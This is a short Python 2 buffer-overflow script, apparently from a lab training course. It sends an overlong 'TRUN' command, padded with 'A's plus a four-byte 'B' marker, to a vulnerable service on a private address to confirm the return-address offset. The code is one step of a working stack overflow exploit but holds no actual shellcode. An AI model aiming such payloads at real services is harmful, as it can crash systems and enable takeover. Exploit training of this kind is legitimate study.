#!/usr/bin/python
#Find the Offset Script Cyber Mentor
#7/23/2020
#yankeezeroone

import sys, socket


shellcode = "A" * 2003 + "B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.3.37',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()

